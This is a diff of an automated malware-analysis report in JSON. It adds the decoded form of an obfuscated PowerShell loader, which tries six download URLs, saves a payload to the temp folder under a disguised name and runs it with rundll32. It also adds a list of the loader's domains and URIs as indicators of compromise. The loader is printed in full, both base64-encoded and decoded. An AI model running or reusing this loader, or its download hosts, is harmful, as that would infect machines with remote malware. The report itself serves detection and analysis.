@@ -1,7 +1,7 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 121,
+    "score": 122,
     "sections": [
       {
         "auto_collapse": false,
@@ -100,7 +100,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "powershell -encodedcommand \"UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAANQA7ACQARABpAHMAaABlAHIAaQB0AG8AcgBOAG8AcgBpAHQAZQAgAD0AIAAoACIAaAB0AHQAcABzADoALwAvAGwAbwBqAGEAbAB6ADEANAAuAGMAbwBtAC4AYgByAC8AOABqAEoAMwBiAC8ATgBZADMAeQBxAEIALABoAHQAdABwAHMAOgAvAC8AcgBlAGQAYgBvAG8AawAuAGMAbABvAHUAZAAvADkATwBHAHoATgBIAC8ATQBpAEQAbQBQADcAQwBoAEEALABoAHQAdABwAHMAOgAvAC8AdgBlAGwAZQB5AC4AYwBvAC8ANQB4AHgAawAyAEwALwB1AFUAOQBnAGcAYwBqAEMALABoAHQAdABwAHMAOgAvAC8AYwBhAHAAcwBpAG0AcABvAHIAdABzAC4AcwBoAG8AcAAvAGgAcgBTAEQAaAAvAG0AMgBpADUAcgBXAHgAMAA1AGMAbQBsACwAaAB0AHQAcABzADoALwAvAHUAdABpAGwAaQBtAGkAeABuAGEAdABhAGwALgBjAG8AbQAuAGIAcgAvAEQASgA5AGMALwB4ADIAeQBSAGMAZABDADEAOABTACwAaAB0AHQAcABzADoALwAvAGQAcwB0AC4AYwBvAC4AdAB6AC8AQQBzAFoAVwB1AFUAbAAvADQAVABqADEAdAAiACkALgBzAHAAbABpAHQAKAAiACwAIgApADsAZgBvAHIAZQBhAGMAaAAgACgAJABhAGMAdQBpAHQAeQBaAHkAbQBvAHAAaABvAHIAaQBjACAAaQBuACAAJABEAGkAcwBoAGUAcgBpAHQAbwByAE4AbwByAGkAdABlACkAIAB7AHQAcgB5ACAAewB3AGcAZQB0ACAAJABhAGMAdQBpAHQAeQBaAHkAbQBvAHAAaABvAHIAaQBjACAALQBUAGkAbQBlAG8AdQB0AFMAZQBjACAAMgAwACAALQBPACAAJABlAG4AdgA6AFQARQBNAFAAXABxAHUAYQBkAHIAaQBnAGUAbQBpAG4AYQBsAEcAcgBhAHYAZQBsAGUAZAAuAEgAZQBnAGUAbQBvAG4AUwBsAG8AdABlAGQAOwBpAGYAIAAoACgARwBlAHQALQBJAHQAZQBtACAAJABlAG4AdgA6AFQARQBNAFAAXABxAHUAYQBkAHIAaQBnAGUAbQBpAG4AYQBsAEcAcgBhAHYAZQBsAGUAZAAuAEgAZQBnAGUAbQBvAG4AUwBsAG8AdABlAGQAKQAuAGwAZQBuAGcAdABoACAALQBnAGUAIAAxADAAMAAwADAAMAApACAAewBwAG8AdwBlAHIAcwBoAGUAbABsACAALQBlAG4AYwBvAGQAZQBkAGMAbwBtAG0AYQBuAGQAIAAiAGMAdwBCADAAQQBHAEUAQQBjAGcAQgAwAEEAQwBBAEEAYwBnAEIAMQBBAEcANABBAFoAQQBCAHMAQQBHAHcAQQBNAHcAQQB5AEEAQwBBAEEASgBBAEIAbABBAEcANABBAGQAZwBBADYAQQBGAFEAQQBSAFEAQgBOAEEARgBBAEEAWABBAEIAeABBAEgAVQBBAFkAUQBCAGsAQQBIAEkAQQBhAFEAQgBuAEEARwBVAEEAYgBRAEIAcABBAEcANABBAFkAUQBCAHMAQQBFAGMAQQBjAGcAQgBoAEEASABZAEEAWgBRAEIAcwBBAEcAVQBBAFoAQQBBAHUAQQBFAGcAQQBaAFEAQgBuAEEARwBVAEEAYgBRAEIAdgBBAEcANABBAFUAdwBCAHMAQQBHADgAQQBkAEEAQgBsAEEARwBRAEEATABBAEIATgBBAEcAOABBAGQAQQBCAGsAQQBEAHMAQQAiADsAYgByAGUAYQBrADsAfQB9AGMAYQB0AGMAaAAgAHsAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAANQA7AH0AfQA=\"",
+        "body": "Start-Sleep -Seconds 5;$DisheritorNorite = (\"https://lojalz14.com.br/8jJ3b/NY3yqB,https://redbook.cloud/9OGzNH/MiDmP7ChA,https://veley.co/5xxk2L/uU9ggcjC,https://capsimports.shop/hrSDh/m2i5rWx05cml,https://utilimixnatal.com.br/DJ9c/x2yRcdC18S,https://dst.co.tz/AsZWuUl/4Tj1t\").split(\",\");foreach ($acuityZymophoric in $DisheritorNorite) {try {wget $acuityZymophoric -TimeoutSec 20 -O $env:TEMP\\quadrigeminalGraveled.HegemonSloted;if ((Get-Item $env:TEMP\\quadrigeminalGraveled.HegemonSloted).length -ge 100000) {powershell -encodedcommand \"cwB0AGEAcgB0ACAAcgB1AG4AZABsAGwAMwAyACAAJABlAG4AdgA6AFQARQBNAFAAXABxAHUAYQBkAHIAaQBnAGUAbQBpAG4AYQBsAEcAcgBhAHYAZQBsAGUAZAAuAEgAZQBnAGUAbQBvAG4AUwBsAG8AdABlAGQALABNAG8AdABkADsA\";break;}}catch {Start-Sleep -Seconds 5;}}",
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -109,12 +109,59 @@
           "dynamic": {
             "process": {
               "command_line": [
-                "powershell -encodedcommand \"UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAANQA7ACQARABpAHMAaABlAHIAaQB0AG8AcgBOAG8AcgBpAHQAZQAgAD0AIAAoACIAaAB0AHQAcABzADoALwAvAGwAbwBqAGEAbAB6ADEANAAuAGMAbwBtAC4AYgByAC8AOABqAEoAMwBiAC8ATgBZADMAeQBxAEIALABoAHQAdABwAHMAOgAvAC8AcgBlAGQAYgBvAG8AawAuAGMAbABvAHUAZAAvADkATwBHAHoATgBIAC8ATQBpAEQAbQBQADcAQwBoAEEALABoAHQAdABwAHMAOgAvAC8AdgBlAGwAZQB5AC4AYwBvAC8ANQB4AHgAawAyAEwALwB1AFUAOQBnAGcAYwBqAEMALABoAHQAdABwAHMAOgAvAC8AYwBhAHAAcwBpAG0AcABvAHIAdABzAC4AcwBoAG8AcAAvAGgAcgBTAEQAaAAvAG0AMgBpADUAcgBXAHgAMAA1AGMAbQBsACwAaAB0AHQAcABzADoALwAvAHUAdABpAGwAaQBtAGkAeABuAGEAdABhAGwALgBjAG8AbQAuAGIAcgAvAEQASgA5AGMALwB4ADIAeQBSAGMAZABDADEAOABTACwAaAB0AHQAcABzADoALwAvAGQAcwB0AC4AYwBvAC4AdAB6AC8AQQBzAFoAVwB1AFUAbAAvADQAVABqADEAdAAiACkALgBzAHAAbABpAHQAKAAiACwAIgApADsAZgBvAHIAZQBhAGMAaAAgACgAJABhAGMAdQBpAHQAeQBaAHkAbQBvAHAAaABvAHIAaQBjACAAaQBuACAAJABEAGkAcwBoAGUAcgBpAHQAbwByAE4AbwByAGkAdABlACkAIAB7AHQAcgB5ACAAewB3AGcAZQB0ACAAJABhAGMAdQBpAHQAeQBaAHkAbQBvAHAAaABvAHIAaQBjACAALQBUAGkAbQBlAG8AdQB0AFMAZQBjACAAMgAwACAALQBPACAAJABlAG4AdgA6AFQARQBNAFAAXABxAHUAYQBkAHIAaQBnAGUAbQBpAG4AYQBsAEcAcgBhAHYAZQBsAGUAZAAuAEgAZQBnAGUAbQBvAG4AUwBsAG8AdABlAGQAOwBpAGYAIAAoACgARwBlAHQALQBJAHQAZQBtACAAJABlAG4AdgA6AFQARQBNAFAAXABxAHUAYQBkAHIAaQBnAGUAbQBpAG4AYQBsAEcAcgBhAHYAZQBsAGUAZAAuAEgAZQBnAGUAbQBvAG4AUwBsAG8AdABlAGQAKQAuAGwAZQBuAGcAdABoACAALQBnAGUAIAAxADAAMAAwADAAMAApACAAewBwAG8AdwBlAHIAcwBoAGUAbABsACAALQBlAG4AYwBvAGQAZQBkAGMAbwBtAG0AYQBuAGQAIAAiAGMAdwBCADAAQQBHAEUAQQBjAGcAQgAwAEEAQwBBAEEAYwBnAEIAMQBBAEcANABBAFoAQQBCAHMAQQBHAHcAQQBNAHcAQQB5AEEAQwBBAEEASgBBAEIAbABBAEcANABBAGQAZwBBADYAQQBGAFEAQQBSAFEAQgBOAEEARgBBAEEAWABBAEIAeABBAEgAVQBBAFkAUQBCAGsAQQBIAEkAQQBhAFEAQgBuAEEARwBVAEEAYgBRAEIAcABBAEcANABBAFkAUQBCAHMAQQBFAGMAQQBjAGcAQgBoAEEASABZAEEAWgBRAEIAcwBBAEcAVQBBAFoAQQBBAHUAQQBFAGcAQQBaAFEAQgBuAEEARwBVAEEAYgBRAEIAdgBBAEcANABBAFUAdwBCAHMAQQBHADgAQQBkAEEAQgBsAEEARwBRAEEATABBAEIATgBBAEcAOABBAGQAQQBCAGsAQQBEAHMAQQAiADsAYgByAGUAYQBrADsAfQB9AGMAYQB0AGMAaAAgAHsAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAANQA7AH0AfQA=\""
+                "Start-Sleep -Seconds 5;$DisheritorNorite = (\"https://lojalz14.com.br/8jJ3b/NY3yqB,https://redbook.cloud/9OGzNH/MiDmP7ChA,https://veley.co/5xxk2L/uU9ggcjC,https://capsimports.shop/hrSDh/m2i5rWx05cml,https://utilimixnatal.com.br/DJ9c/x2yRcdC18S,https://dst.co.tz/AsZWuUl/4Tj1t\").split(\",\");foreach ($acuityZymophoric in $DisheritorNorite) {try {wget $acuityZymophoric -TimeoutSec 20 -O $env:TEMP\\quadrigeminalGraveled.HegemonSloted;if ((Get-Item $env:TEMP\\quadrigeminalGraveled.HegemonSloted).length -ge 100000) {powershell -encodedcommand \"cwB0AGEAcgB0ACAAcgB1AG4AZABsAGwAMwAyACAAJABlAG4AdgA6AFQARQBNAFAAXABxAHUAYQBkAHIAaQBnAGUAbQBpAG4AYQBsAEcAcgBhAHYAZQBsAGUAZAAuAEgAZQBnAGUAbQBvAG4AUwBsAG8AdABlAGQALABNAG8AdABkADsA\";break;}}catch {Start-Sleep -Seconds 5;}}"
               ]
             }
           }
         },
         "title_text": "The script ran the following commands",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"capsimports.shop\"}, {\"ioc_type\": \"domain\", \"ioc\": \"dst.co.tz\"}, {\"ioc_type\": \"domain\", \"ioc\": \"lojalz14.com.br\"}, {\"ioc_type\": \"domain\", \"ioc\": \"redbook.cloud\"}, {\"ioc_type\": \"domain\", \"ioc\": \"utilimixnatal.com.br\"}, {\"ioc_type\": \"domain\", \"ioc\": \"veley.co\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://capsimports.shop/hrsdh/m2i5rwx05cml\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/hrsdh/m2i5rwx05cml\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://dst.co.tz/aszwuul/4tj1t\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/aszwuul/4tj1t\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://lojalz14.com.br/8jj3b/ny3yqb\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/8jj3b/ny3yqb\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://redbook.cloud/9ogznh/midmp7cha\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/9ogznh/midmp7cha\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://utilimixnatal.com.br/dj9c/x2yrcdc18s\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/dj9c/x2yrcdc18s\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://veley.co/5xxk2l/uu9ggcjc\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/5xxk2l/uu9ggcjc\"}]",
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 2,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 2,
+          "score": 1,
+          "score_map": {},
+          "signatures": {}
+        },
+        "tags": {
+          "network": {
+            "static": {
+              "domain": [
+                "capsimports.shop",
+                "dst.co.tz",
+                "lojalz14.com.br",
+                "redbook.cloud",
+                "utilimixnatal.com.br",
+                "veley.co"
+              ],
+              "uri": [
+                "https://capsimports.shop/hrsdh/m2i5rwx05cml",
+                "https://dst.co.tz/aszwuul/4tj1t",
+                "https://lojalz14.com.br/8jj3b/ny3yqb",
+                "https://redbook.cloud/9ogznh/midmp7cha",
+                "https://utilimixnatal.com.br/dj9c/x2yrcdc18s",
+                "https://veley.co/5xxk2l/uu9ggcjc"
+              ],
+              "uri_path": [
+                "/hrsdh/m2i5rwx05cml",
+                "/aszwuul/4tj1t",
+                "/8jj3b/ny3yqb",
+                "/9ogznh/midmp7cha",
+                "/dj9c/x2yrcdc18s",
+                "/5xxk2l/uu9ggcjc"
+              ]
+            }
+          }
+        },
+        "title_text": "IOCs found in command lines",
         "zeroize_on_tag_safe": false
       }
     ]
@@ -122,8 +169,8 @@
   "files": {
     "extracted": [
       {
-        "name": "cmd_0.bat",
-        "sha256": "0584528dedc478add926876bb5530ec4ffedf88b7a4b1f867563703475b61793"
+        "name": "boxjs_cmds.ps1",
+        "sha256": "a33c35a1433caaaa3db453daec3f2e667dae45012cd9dbd740e4d88c6b29a8c4"
       }
     ],
     "supplementary": [
@@ -135,6 +182,11 @@
   },
   "results": {
     "heuristics": [
+      {
+        "attack_ids": [],
+        "heur_id": 2,
+        "signatures": []
+      },
       {
         "attack_ids": [],
         "heur_id": 2,
@@ -167,7 +219,103 @@
         {
           "heur_id": null,
           "signatures": [],
-          "value": "powershell -encodedcommand \"UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAANQA7ACQARABpAHMAaABlAHIAaQB0AG8AcgBOAG8AcgBpAHQAZQAgAD0AIAAoACIAaAB0AHQAcABzADoALwAvAGwAbwBqAGEAbAB6ADEANAAuAGMAbwBtAC4AYgByAC8AOABqAEoAMwBiAC8ATgBZADMAeQBxAEIALABoAHQAdABwAHMAOgAvAC8AcgBlAGQAYgBvAG8AawAuAGMAbABvAHUAZAAvADkATwBHAHoATgBIAC8ATQBpAEQAbQBQADcAQwBoAEEALABoAHQAdABwAHMAOgAvAC8AdgBlAGwAZQB5AC4AYwBvAC8ANQB4AHgAawAyAEwALwB1AFUAOQBnAGcAYwBqAEMALABoAHQAdABwAHMAOgAvAC8AYwBhAHAAcwBpAG0AcABvAHIAdABzAC4AcwBoAG8AcAAvAGgAcgBTAEQAaAAvAG0AMgBpADUAcgBXAHgAMAA1AGMAbQBsACwAaAB0AHQAcABzADoALwAvAHUAdABpAGwAaQBtAGkAeABuAGEAdABhAGwALgBjAG8AbQAuAGIAcgAvAEQASgA5AGMALwB4ADIAeQBSAGMAZABDADEAOABTACwAaAB0AHQAcABzADoALwAvAGQAcwB0AC4AYwBvAC4AdAB6AC8AQQBzAFoAVwB1AFUAbAAvADQAVABqADEAdAAiACkALgBzAHAAbABpAHQAKAAiACwAIgApADsAZgBvAHIAZQBhAGMAaAAgACgAJABhAGMAdQBpAHQAeQBaAHkAbQBvAHAAaABvAHIAaQBjACAAaQBuACAAJABEAGkAcwBoAGUAcgBpAHQAbwByAE4AbwByAGkAdABlACkAIAB7AHQAcgB5ACAAewB3AGcAZQB0ACAAJABhAGMAdQBpAHQAeQBaAHkAbQBvAHAAaABvAHIAaQBjACAALQBUAGkAbQBlAG8AdQB0AFMAZQBjACAAMgAwACAALQBPACAAJABlAG4AdgA6AFQARQBNAFAAXABxAHUAYQBkAHIAaQBnAGUAbQBpAG4AYQBsAEcAcgBhAHYAZQBsAGUAZAAuAEgAZQBnAGUAbQBvAG4AUwBsAG8AdABlAGQAOwBpAGYAIAAoACgARwBlAHQALQBJAHQAZQBtACAAJABlAG4AdgA6AFQARQBNAFAAXABxAHUAYQBkAHIAaQBnAGUAbQBpAG4AYQBsAEcAcgBhAHYAZQBsAGUAZAAuAEgAZQBnAGUAbQBvAG4AUwBsAG8AdABlAGQAKQAuAGwAZQBuAGcAdABoACAALQBnAGUAIAAxADAAMAAwADAAMAApACAAewBwAG8AdwBlAHIAcwBoAGUAbABsACAALQBlAG4AYwBvAGQAZQBkAGMAbwBtAG0AYQBuAGQAIAAiAGMAdwBCADAAQQBHAEUAQQBjAGcAQgAwAEEAQwBBAEEAYwBnAEIAMQBBAEcANABBAFoAQQBCAHMAQQBHAHcAQQBNAHcAQQB5AEEAQwBBAEEASgBBAEIAbABBAEcANABBAGQAZwBBADYAQQBGAFEAQQBSAFEAQgBOAEEARgBBAEEAWABBAEIAeABBAEgAVQBBAFkAUQBCAGsAQQBIAEkAQQBhAFEAQgBuAEEARwBVAEEAYgBRAEIAcABBAEcANABBAFkAUQBCAHMAQQBFAGMAQQBjAGcAQgBoAEEASABZAEEAWgBRAEIAcwBBAEcAVQBBAFoAQQBBAHUAQQBFAGcAQQBaAFEAQgBuAEEARwBVAEEAYgBRAEIAdgBBAEcANABBAFUAdwBCAHMAQQBHADgAQQBkAEEAQgBsAEEARwBRAEEATABBAEIATgBBAEcAOABBAGQAQQBCAGsAQQBEAHMAQQAiADsAYgByAGUAYQBrADsAfQB9AGMAYQB0AGMAaAAgAHsAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAANQA7AH0AfQA=\""
+          "value": "Start-Sleep -Seconds 5;$DisheritorNorite = (\"https://lojalz14.com.br/8jJ3b/NY3yqB,https://redbook.cloud/9OGzNH/MiDmP7ChA,https://veley.co/5xxk2L/uU9ggcjC,https://capsimports.shop/hrSDh/m2i5rWx05cml,https://utilimixnatal.com.br/DJ9c/x2yRcdC18S,https://dst.co.tz/AsZWuUl/4Tj1t\").split(\",\");foreach ($acuityZymophoric in $DisheritorNorite) {try {wget $acuityZymophoric -TimeoutSec 20 -O $env:TEMP\\quadrigeminalGraveled.HegemonSloted;if ((Get-Item $env:TEMP\\quadrigeminalGraveled.HegemonSloted).length -ge 100000) {powershell -encodedcommand \"cwB0AGEAcgB0ACAAcgB1AG4AZABsAGwAMwAyACAAJABlAG4AdgA6AFQARQBNAFAAXABxAHUAYQBkAHIAaQBnAGUAbQBpAG4AYQBsAEcAcgBhAHYAZQBsAGUAZAAuAEgAZQBnAGUAbQBvAG4AUwBsAG8AdABlAGQALABNAG8AdABkADsA\";break;}}catch {Start-Sleep -Seconds 5;}}"
+        }
+      ],
+      "network.static.domain": [
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "capsimports.shop"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "dst.co.tz"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "lojalz14.com.br"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "redbook.cloud"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "utilimixnatal.com.br"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "veley.co"
+        }
+      ],
+      "network.static.uri": [
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "https://capsimports.shop/hrsdh/m2i5rwx05cml"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "https://dst.co.tz/aszwuul/4tj1t"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "https://lojalz14.com.br/8jj3b/ny3yqb"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "https://redbook.cloud/9ogznh/midmp7cha"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "https://utilimixnatal.com.br/dj9c/x2yrcdc18s"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "https://veley.co/5xxk2l/uu9ggcjc"
+        }
+      ],
+      "network.static.uri_path": [
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "/5xxk2l/uu9ggcjc"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "/8jj3b/ny3yqb"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "/9ogznh/midmp7cha"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "/aszwuul/4tj1t"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "/dj9c/x2yrcdc18s"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "/hrsdh/m2i5rwx05cml"
         }
       ]
     },
